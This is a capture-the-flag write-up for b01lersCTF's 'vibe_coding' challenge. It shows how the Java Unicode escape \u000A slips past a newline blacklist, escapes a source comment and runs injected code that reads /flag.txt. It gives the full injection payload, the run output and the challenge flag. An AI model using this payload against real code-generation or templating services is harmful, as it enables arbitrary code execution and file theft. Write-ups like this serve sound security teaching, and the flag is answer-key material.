

# b01lersCTF — “vibe_coding” Write‑Up

> All it takes to break the system is one sneaky newline.

---

## Why I Picked This One

**“vibe_coding”**  is literally someone using ai to do code which in my opinion is not very practical and the code provided with the challenge does prove that if it was wriiten by an ai. 

---

## What You Need

- **Python 3.8+**

- **Java** (for server-side execution)

- **Basic Unicode + code injection knowledge**

---

## The Challenge in a Nutshell

You're given a Python script (`server.py`) that :

1. Prompts the user for a **comment string**,

2. Injects that into a hardcoded Java template,

3. Writes the file to `Main.java`,

4. **Compiles and runs it**.

It filters out :

```python
blacklist = ['\r', '\n']
```

But it doesn't block **Unicode escapes**, like `\u000A`, which represents a newline in Java source code.

---

## What the Server Code Shows (`server.py`)

Here’s the relevant piece:

```python
FILE_TEMPLATE = """
import java.io.*;

public class Main {
    // %s
    public static void main(String[] args) {
        // TODO: implement me
    }

    public static String getFlag() throws IOException {
        throw new RuntimeException("Not implemented yet");
        // var br = new BufferedReader(new FileReader("/flag.txt"));
        // return br.readLine();
    }
}
"""
```

So your input is dropped into the `// %s` spot — as a **Java comment**.

---

## Step 1: Inject a Line Break

Use the Java escape sequence:

```java
\u000A
```

This turns into a **newline at compile time** — which lets you break out of the comment and write real code.

---

## Step 2: Full Exploit Payload

Here’s the input you feed into the prompt:

```java
\u000A static {try { System.out.println(new java.io.BufferedReader(new java.io.FileReader("/flag.txt")).readLine()); } catch (Exception e) { e.printStackTrace(); }}
```

It:

- Breaks the comment with `\u000A`

- Reads and outputs `flag.txt`

- Wraps it in `try/catch` to avoid a crash if something goes wrong

---

## What It Looked Like When I Ran It

```
+
|        ______  _____  _____  ____    ______  _____   ______   ______  _____  _____   _____
|       |      >/     ||_    ||    |  |   ___||     | |   ___| |   ___|/     \|     | |     |
|       |     < |  /  | |    ||    |_ |   ___||     \  `-.`-.  |   |__ |     ||     \ |    _|_
|       |______>|_____/ |____||______||______||__|\__\|______| |______|\_____/|__|\__\|___| |_|
+
Welcome to b01lersCorp Semantic LOad-balanced Program GENerator (SLOPGEN) v3.20.25.
    
Enter your prompt below:
> \u000A static {try { System.out.println(new java.io.BufferedReader(new java.io.FileReader("/flag.txt")).readLine()); } catch (Exception e) { e.printStackTrace(); }}

Your program output:

bctf{un1c0d3_abn0rmal1z4t1on_493e42fc}
```

- Here is the flag: bctf{un1c0d3_abn0rmal1z4t1on_493e42fc}

---

## Lessons Learned

1. **Unicode escapes are dangerous** — don’t trust what you can’t see.

2. **Blacklisting is fragile** — especially when you forget to block `\u000A`, which is a newline in Java.

3. **Templates with direct code injection** need **real sanitization**, not just character filters.




